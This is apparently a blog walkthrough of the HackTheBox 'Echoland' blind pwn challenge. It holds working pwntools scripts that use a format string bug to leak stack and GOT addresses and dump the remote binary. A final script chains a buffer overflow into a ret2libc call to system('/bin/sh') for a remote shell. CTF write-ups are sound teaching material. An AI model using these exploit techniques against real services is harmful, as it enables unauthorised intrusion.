---
title: "HackTheBox [Challenge]: Echoland"
date: 2025-12-12
categories: [HackTheBox, Challenge]
tags: [format-string, blind-pwn]
---
## Enumeration
This is a blind pwnable challenge. The only information provided to players is an IP address and a port to connect to and gather information from.
```
$ nc 154.57.164.76 31818

🦇 Inside the dark cave. 🦇
1. Scream.
2. Run outside.
> 1
>> a
Your friend did not recognize you and ran the other way!
$ nc 154.57.164.76 31818

🦇 Inside the dark cave. 🦇
1. Scream.
2. Run outside.
> 2
2

1. Scream.
2. Run outside.
> %p
0x6e

1. Scream.
2. Run outside.
> 1
>> %p
Your friend did not recognize you and ran the other way!
```
As my guess, blind pwn challenges often come with a format string vulnerability.
## Leaking stack frame
I use this code to leak stack frame:
```
from pwn import *

p = remote('154.57.164.76', 31818)

for k in range(20):
    p.sendlineafter(b'> ', f'%{k}$p'.encode())
    leak = p.recvline().decode().strip()
    print(f'{k}: {leak}')
```
Output:
```
$ python3 exploit.py
[+] Opening connection to 154.57.164.76 on port 31818: Done
0: %0$p
1: 0x6e
2: 0xfffffff4
3: 0x7f7ccfce8151
4: 0x1d
5: 0x7f7ccfd46a10
6: 0x7ffd1c4ff958
7: 0x100000000
8: 0xa70243825
9: (nil)
10: 0x7ffd00000000
11: 0x100000000
12: 0x55835f574400
13: 0x7f7ccfbf9bf7
14: 0x2000000000
15: 0x7ffd1c4ff958
16: 0x100000000
17: 0x55835f5742ef
18: (nil)
19: 0x2bfed27dd4fb2849
[*] Closed connection to 154.57.164.76 port 31818
$ python3 exploit.py
[+] Opening connection to 154.57.164.76 on port 31818: Done
0: %0$p
1: 0x6e
2: 0xfffffff4
3: 0x7f899ae8f151
4: 0x1d
5: 0x7f899aeeda10
6: 0x7ffcb57a40c8
7: 0x100000000
8: 0xa70243825
9: (nil)
10: 0x7ffc00000000
11: 0x100000000
12: 0x5611c591a400
13: 0x7f899ada0bf7
14: 0x2000000000
15: 0x7ffcb57a40c8
16: 0x100000000
17: 0x5611c591a2ef
18: (nil)
19: 0xea0557b61105ce59
[*] Closed connection to 154.57.164.76 port 31818
```
The following information can be extracted from the leaked output: buffer input at the 8th stack argument and PIE.
## Leaking exe base
Getting exe address at the 12th stack argument.
```
from pwn import *

p = remote('154.57.164.76', 31818)

exe_base = 0

def leak_exe_address():
    global exe_base
    p.sendlineafter(b'> ', b'%12$p')
    exe_base = int(p.recvline()[:-1], 16) - 0x400
    info('Leak exe: ' + hex(exe_base))

leak_exe_address()
```
Output:
```
$ python3 exploit.py
[+] Opening connection to 154.57.164.76 on port 31818: Done
[*] Leak exe: 0x55ea90631000
[*] Closed connection to 154.57.164.76 port 31818
```
Leaking base exe address via [Magic Byte of ELF](https://www.dev-toolbox.tech/tools/hex-editor/examples/elf-file-signature)
```
def leak_base_exe(exe_base):
    while True:
        info('Test exe base: ' + hex(exe_base))
        payload = b'%9$sAAAA' + p64(exe_base)
        p.sendlineafter(b'> ', payload)
        leak = p.recvline()
        print(leak)
        if b'\x7FELF' in leak:
            info('Exe base: ' + hex(exe_base))
            break
        exe_base -= 0x1000

leak_base_exe(exe_base)
```
Output:
```
$ python3 exploit.py
[+] Opening connection to 154.57.164.76 on port 31818: Done
[*] Leak exe: 0x55607a0da000
[*] Test exe base: 0x55607a0da000
b'\xf3\x0f\x1e\xfaH\x83\xec\x08H\x8b\x05\xd9/AAAA\n'
[*] Test exe base: 0x55607a0d9000
b'\x7fELF\x02\x01\x01AAAA\n'
[*] Exe base: 0x55607a0d9000
[*] Closed connection to 154.57.164.76 port 31818
```
## Dumping binary file
I used the code from a [blog](https://fdlucifer.github.io/2021/12/11/echoland/) as a reference. However, it did not work as expected on my machine. I noticed that the script was also capturing the program's menu output along with the leaked bytes, which corrupted the reconstructed ELF file. I'm not entirely sure why this behavior occurred, I modified a few lines of the script so that it only extracted the leaked data required for rebuilding the binary.


The output was incorrect:
```
$ python3 exploit.py
[+] Opening connection to 154.57.164.76 on port 31818: Done
[*] Leak exe: 0x55eca85bb000
Address: 0x55eca85bb000 - Offset: 0:0x0 - Leaked data:
1. Scream.
2. Run outside.
> \x00
Address: 0x55eca85bb01f - Offset: 31:0x1f - Leaked data: \x7fELF\x02\x01\x01\x00
Address: 0x55eca85bb027 - Offset: 39:0x27 - Leaked data: \x00
Address: 0x55eca85bb028 - Offset: 40:0x28 - Leaked data: \x00
Address: 0x55eca85bb029 - Offset: 41:0x29 - Leaked data: ;\x00
Address: 0x55eca85bb02c - Offset: 44:0x2c - Leaked data: ;\x00
```

Code after fixing:
```
def dump_binary(exe_base):
    base = exe_base
    leak,leaked = bytearray(),bytearray()
    offset = len(leaked)
    while offset <= 0x5000:
        with open("echoland.bin", "ab") as l:
            addr = p64(base + len(leaked))
            leak_part = b"%9$sEOF\x00"
            p.sendlineafter(b'> ', leak_part + addr)
            resp = p.recvline()
            leak = resp.split(b"EOF")[0] + b"\x00"
            leaked.extend(leak)
            address_value = u64(addr.ljust(8, b"\x00"))
            print("Address: " + hex(address_value) + " - Offset: " + str(offset) + ":" + hex(offset)+ " - Leaked data: " + leak.decode("unicode_escape", errors="replace"))
            l.write(leak)
            l.flush()
            offset = len(leaked)
```
Output:
```
$ python3 exploit.py
[+] Opening connection to 154.57.164.76 on port 31818: Done
[*] Leak exe: 0x55eca85bb000
Address: 0x55eca85bb000 - Offset: 0:0x0 - Leaked data:
1. Scream.
2. Run outside.
> \x00
Address: 0x55eca85bb01f - Offset: 31:0x1f - Leaked data: \x7fELF\x02\x01\x01\x00
Address: 0x55eca85bb027 - Offset: 39:0x27 - Leaked data: \x00
Address: 0x55eca85bb028 - Offset: 40:0x28 - Leaked data: \x00
Address: 0x55eca85bb029 - Offset: 41:0x29 - Leaked data: ;\x00
Address: 0x55eca85bb02c - Offset: 44:0x2c - Leaked data: ;\x00
Address: 0x55eca85bb02e - Offset: 46:0x2e - Leaked data: \x00
Address: 0x55eca85bb02f - Offset: 47:0x2f - Leaked data: \x00
Address: 0x55eca85bb030 - Offset: 48:0x30 - Leaked data: \x00
Address: 0x55eca85bb031 - Offset: 49:0x31 - Leaked data: \x00
Address: 0x55eca85bb032 - Offset: 50:0x32 - Leaked data: \x00
...
Address: 0x55eca85bfffd - Offset: 20477:0x4ffd - Leaked data: \x00
Address: 0x55eca85bfffe - Offset: 20478:0x4ffe - Leaked data: \x00
Address: 0x55eca85bffff - Offset: 20479:0x4fff - Leaked data: \x00
Address: 0x55eca85c0000 - Offset: 20480:0x5000 - Leaked data: \x00
[*] Closed connection to 154.57.164.76 port 31818
```
## Reverse engineering
Although I wasn't able to reconstruct a perfect binary, the dumped file was still sufficient for IDA to analyze and produce a decompiled output.
```
$ file echoland.bin
echoland.bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, too large section header offset 2594073387297144832
```
Main function:
```
__int64 __fastcall sub_12EF()
{
  _BYTE *v0; // rdi
  _BYTE v2[28]; // [rsp+10h] [rbp-20h] BYREF
  int v3; // [rsp+2Ch] [rbp-4h]

  sub_1260();
  v3 = 1;
  sub_1110(v2, 0, 20);
  sub_10E0("\n");
  while ( 1 )
  {
    sub_1100("1. Scream.\n");
    v2[sub_1120(0, v2, 19)] = 0;
    v0 = v2;
    if ( sub_10F0(v2, 110) )
    {
      sub_10E0("Run outside.\n");
      v0 = (_BYTE *)(&dword_0 + 1);
      sub_1150(1);
    }
    if ( v2[0] == 0x74 )
      break;
    sub_1100(v2);
    sub_10D0(10);
  }
  if ( v3 )
  {
    if ( (unsigned int)sub_12A7(v0) )
      sub_10E0(&unk_20C0);
    else
      sub_10E0("you fainted!");
  }
  return 0;
}
```
Since the machine code and assembly output looked quite cluttered, I decided to dump the binary using the `xxd` command to inspect its raw hexadecimal contents directly. My goal was to identify any useful information.
![alt text](/assets/media/2025-12-12-hackthebox-challenge-echoland/xxd.png)
So, I guess:

| Before   | After   | Offset |
| :------- | :------ | -----: |
| sub_1140 | setvbuf |  3FC8  |
| sub_1110 | memset  |  3FB0  |
| sub_1100 | printf  |  3FA8  |
| sub_1120 | read    |  3FB8  |
| sub_10E0 | puts    |  3F98  |
| sub_1150 | exit    |  3FD0  |

I also found another function vulnerable to a buffer overflow.
```
__int64 sub_12A7()
{
  _BYTE v1[64]; // [rsp+0h] [rbp-40h] BYREF

  printf(">> ");
  read(0, v1, 150);
  return sub_1130(v1, "n0ch4nch3t0gu3s$th1$");
}
```
This function is triggered by selecting Option 1.
![alt text](/assets/media/2025-12-12-hackthebox-challenge-echoland/trigger_bof.png)
## Finding the version of libc
Leaking:
```
def leak_got_address(name, offset):
    global exe_base
    # leak_exe_address()
    p.sendlineafter(b'> ', b'%9$sEOF\x00' + p64(exe_base + offset))
    a = p.recvline()
    libc = a.split(b"EOF")[0] + b"\x00"
    info(f'Leak {name} got: ' + hex(u64(libc.ljust(8, b"\x00"))))


leak_exe_address()
leak_got_address('setvbuf', 0x3FC8)
leak_got_address('memset', 0x3FB0)
leak_got_address('puts', 0x3F98)
leak_got_address('printf', 0x3FA8)
leak_got_address('read', 0x3Fb8)
leak_got_address('exit', 0x3Fd0)
```
Output:
```
$ python3 exploit.py
[+] Opening connection to 154.57.164.62 on port 32275: Done
[*] Leak exe: 0x556fea8be000
[*] Leak setvbuf got: 0x7fc47fa893d0
[*] Leak memset got: 0x7fc47fb96e90
[*] Leak puts got: 0x7fc47fa88aa0
[*] Leak printf got: 0x7fc47fa6cf70
[*] Leak read got: 0x7fc47fb18140
[*] Leak exit got: 0x7fc47fa4b240
[*] Closed connection to 154.57.164.62 port 32275
```
Next, we take the last three hexadecimal digits of each leaked libc address and use them to search for the corresponding libc version on [this website](https://libc.blukat.me/).
![alt text](/assets/media/2025-12-12-hackthebox-challenge-echoland/bluekatme.png)
Both versions matched the offsets I checked. After verifying each one, I found that the offsets for system and the "/bin/sh" string were identical, so either version can be used.
## RCE
Script
```
from pwn import *

p = remote('154.57.164.62', 32275)
libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so', checksec=False)
exe_base = 0

p.sendlineafter(b'> ', b'%12$p')
exe_base = int(p.recvline()[:-1], 16) - 0x1400
p.sendlineafter(b'> ', b'%9$sEOF\x00' + p64(exe_base + 0x3FA8))
a = p.recvline()
a = a.split(b"EOF")[0] + b"\x00"
libc.address = u64(a.ljust(8, b"\x00")) - libc.sym.printf
info('Leak exe: ' + hex(exe_base))
info('Leak libc: ' + hex(libc.address))
p.sendlineafter(b'> ', b'1')

payload = b'A'*72 + p64(libc.address + 0x215bf) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.address + 0x215bf + 1) + p64(libc.sym.system)
p.sendlineafter(b'>> ', payload)
p.interactive()
```
Get shell!
![alt text](/assets/media/2025-12-12-hackthebox-challenge-echoland/getshell.png)
